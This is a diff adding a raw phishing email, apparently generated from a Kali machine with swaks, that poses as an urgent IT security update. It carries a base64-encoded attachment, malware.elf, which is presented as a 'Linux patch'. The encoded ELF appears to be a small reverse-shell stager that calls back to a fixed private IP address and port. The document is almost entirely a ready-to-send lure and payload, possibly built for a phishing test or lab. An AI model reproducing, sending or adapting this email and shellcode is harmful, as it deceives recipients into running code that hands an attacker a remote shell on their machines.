@@ -1,0 +1,33 @@
+Date: Fri, 05 Jun 2026 12:25:51 -0400
+To: mailnet1@company.com
+From: mailnet1@kali.local
+Subject: URGENT: Security Update Required - Multiple Documents
+Message-Id: <20260605122551.030018@kali>
+X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_30018"
+
+------=_MIME_BOUNDARY_000_30018
+Content-Type: text/plain
+
+Dear Team,
+
+Please review the attached documents and software updates as soon as possible.
+
+Attachments include:
+- Linux patch (malware.elf) Regards,
+IT Security Team
+------=_MIME_BOUNDARY_000_30018
+Content-Type: application/octet-stream; name="malware.elf"
+Content-Description: malware.elf
+Content-Disposition: attachment; filename="malware.elf"
+Content-Transfer-Encoding: BASE64
+
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
+AAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKjIA2gCABFc
+ieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMM
+sH3NgIXAeBBbieGZsmawA82AhcB4Av/huAEAAAC7AQAAAM2A
+
+------=_MIME_BOUNDARY_000_30018--
+
+
